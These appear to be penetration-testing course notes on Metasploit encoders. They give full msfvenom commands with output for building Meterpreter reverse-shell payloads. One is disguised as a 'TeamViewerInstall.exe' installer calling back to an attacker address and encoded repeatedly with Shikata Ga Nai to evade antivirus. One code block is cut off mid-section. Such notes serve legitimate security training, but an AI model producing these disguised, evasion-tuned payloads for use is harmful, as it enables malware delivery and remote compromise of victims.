### Encoders

```
# Over the 15 years of existence of the Metasploit Framework, Encoders have assisted with making payloads compatible with different processor architectures
# while at the same time helping with antivirus evasion. 
# Encoders come into play with the role of changing the payload to run on different operating systems and architectures. 

# These architectures include:x64, x86, sparc, ppc,	mips
# Shikata Ga Nai (SGN) is one of the most utilized Encoding schemes today because 
# it is so hard to detect that payloads encoded through its mechanism are not universally undetectable anymore.
```

### Selecting an Encoder

```
# Before 2015, the Metasploit Framework had different submodules that took care of payloads and encoders. 
# They were packed separately from the msfconsole script and were called msfpayload and msfencode. 

# After 2015, updates to these scripts have combined them within the msfvenom tool, 
# which takes care of payload generation and Encoding. 
# We will be talking about msfvenom in detail later on. Below is an example of what payload generation would look like with today's msfvenom:

msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl     # Generating payload without encoding
output:
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai chosen with final size 381
Payload size: 381 bytes
...

msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai    # With encoding (sgn)
output:
Found 1 compatible encoders
Attempting to encode payload with 3 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 326 (iteration=0)
x86/shikata_ga_nai succeeded with size 353 (iteration=1)
x86/shikata_ga_nai succeeded with size 380 (iteration=2)
x86/shikata_ga_nai chosen with final size 380
Payload size: 380 bytes
...
```

### Filtering encoders by cpu Architecture (x86, x64 etc.)

```
# Suppose we want to select an Encoder for an existing payload. 
# Then, we can use the show encoders command within the msfconsole to see which encoders 
# are available for our current Exploit module + Payload combination.

msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload 15     # select payload
output:
payload => windows/x64/meterpreter/reverse_tcp

msf6 exploit(windows/smb/ms17_010_eternalblue) > show encoders      # list available encoders (onny x64 related to exploit!)
output:

### Generate payload, check by AV (antivirus)

```
# Take the above example just as thatâ€”a hypothetical example. 
# If we were to encode an executable payload only once with SGN, it would most likely be detected by most antiviruses today. 
# Let's delve into that for a moment. 
# Picking up msfvenom, the subscript of the Framework that deals with payload generation and Encoding schemes, 
# we have the following input:

msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe
output:
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 368 (iteration=0)
x86/shikata_ga_nai chosen with final size 368
Payload size: 368 bytes
Final size of exe file: 73802 bytes
Saved as: TeamViewerInstall.exe

# This will generate a payload with the exe format, called TeamViewerInstall.exe, 
# which is meant to work on x86 architecture processors for the Windows platform, 
# with a hidden Meterpreter reverse_tcp shell payload, encoded once with the Shikata Ga Nai scheme. 
# Let us take the result and upload it to VirusTotal.

output(values From VirusTotal GUI): 
...
54 engines detecting this file: -> Many Viruses detected inside
...

# One better option would be to try running it through multiple iterations of the same Encoding scheme:

msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe

```

```
# As we can see, it is still not enough for AV evasion. 
# There is a high number of products that still detect the payload. 
# Alternatively, Metasploit offers a tool called msf-virustotal that we can use with an API key to analyze our payloads. 
# However, this requires free registration on VirusTotal.

msf-virustotal -k <API key> -f TeamViewerInstall.exe                        # Check file with MSF - VirusTotal
